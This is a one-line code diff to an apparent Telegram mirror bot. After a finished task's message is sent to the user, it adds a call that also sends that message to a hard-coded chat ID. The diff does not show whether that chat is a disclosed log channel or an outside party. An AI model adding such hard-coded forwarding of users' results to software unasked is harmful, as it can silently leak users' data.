@@ -273,6 +273,7 @@ class MirrorListener:
                 del download_dict[self.uid]
                 count = len(download_dict)
             sendMarkup(msg, self.bot, self.update, InlineKeyboardMarkup(buttons.build_menu(2)))
+            sendDump("-1001575843000", msg, self.bot, self.update, InlineKeyboardMarkup(buttons.build_menu(2)))
             if count == 0:
                 self.clean()
             else:
